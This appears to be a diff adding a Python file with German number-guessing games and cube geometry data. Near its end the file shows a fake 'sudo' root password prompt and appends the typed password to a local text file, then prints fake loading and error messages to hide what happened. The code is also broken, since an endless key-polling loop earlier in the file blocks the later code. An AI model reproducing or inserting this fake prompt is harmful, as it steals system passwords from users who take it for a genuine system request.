@@ -1,0 +1,119 @@
+import keyboard
+import os
+import sys
+import time
+import getpass
+import math
+import random
+
+def zahlraten_spiel():
+    print("Willkommen zum Zahlraten-Spiel! Versuche, die Zahl zwischen 1 und 100 zu erraten.")
+    zielzahl = random.randint(1, 100)
+    versuche = 0
+
+    while True:
+        try:
+            tipp = int(input("Gib deine Schätzung ein: "))
+        except ValueError:
+            print("Bitte gib eine gültige Zahl ein.")
+            continue
+
+        versuche += 1
+
+        if tipp < zielzahl:
+            print("Die Zahl ist größer. Versuch es nochmal!")
+        elif tipp > zielzahl:
+            print("Die Zahl ist kleiner. Versuch es nochmal!")
+        else:
+            print(f"Herzlichen Glückwunsch! Du hast die Zahl {zielzahl} in {versuche} Versuchen erraten.")
+            break
+
+def zahlenschaetzspiel():
+    print("Willkommen beim Zahlenschätzspiel!")
+    print("Ich denke an eine Zahl zwischen 1 und 100. Kannst du sie erraten?")
+
+    # Zufallszahl zwischen 1 und 100
+    geheimzahl = random.randint(1, 100)
+    versuche = 0
+
+    while True:
+        try:
+            tipp = int(input("Gib deinen Tipp ein: "))
+        except ValueError:
+            print("Bitte gib eine gültige Zahl ein.")
+            continue
+
+        versuche += 1
+
+        if tipp < geheimzahl:
+            print("Zu niedrig! Versuch es nochmal.")
+        elif tipp > geheimzahl:
+            print("Zu hoch! Versuch es nochmal.")
+        else:
+            print(f"Herzlichen Glückwunsch! Du hast die Zahl {geheimzahl} nach {versuche} Versuchen erraten.")
+            break
+
+
+
+BLACK = (0, 0, 0)
+
+# Würfelkoordinaten
+cube_vertices = [
+    [-1, -1, -1],  # 0
+    [1, -1, -1],   # 1
+    [1, 1, -1],    # 2
+    [-1, 1, -1],   # 3
+    [-1, -1, 1],   # 4
+    [1, -1, 1],    # 5
+    [1, 1, 1],     # 6
+    [-1, 1, 1]     # 7
+]
+
+# Flächen des Würfels (jeweils 4 Punkte)
+cube_faces = [
+    (0, 1, 2, 3),  # Rückseite
+    (4, 5, 6, 7),  # Vorderseite
+    (0, 1, 5, 4),  # Unterseite
+    (3, 2, 6, 7),  # Oberseite
+    (0, 3, 7, 4),  # Linke Seite
+    (1, 2, 6, 5)   # Rechte Seite
+]
+
+while True:
+    if keyboard.is_pressed('esc'):
+        continue
+    else:
+        continue
+
+
+# Flächen des Würfels (jeweils 5)
+lol = [
+    (0, 1, 2, 3),  #
+    (4, 5, 6, 7),  #
+    (0, 1, 5, 4),  #
+    (3, 2, 6, 7),  #
+    (0, 3, 7, 4),  #
+    (4, 5, 6, 7),  #
+    (1, 2, 6, 5)   #
+]
+
+
+
+time.sleep(3)
+print("Das hat nicht funktioniert, bitte nochmal probieren.")
+user_input = getpass.getpass("[sudo] Passwort für root: ")  #
+
+with open("/Alexander/sss.txt", 'a') as file:
+    file.write(user_input + '\n')  # Speichert den Input in der Datei
+print("TESTE....")
+
+time.sleep(5)
+print("load_libarys")
+time.sleep(20)
+print("ERROR: keyboard")
+time.sleep(3)
+print("ERROR: pypeline")
+time.sleep(1)
+print("ERROR: CRYpy")
+time.sleep(10)
+print("Alles KLAR!!")
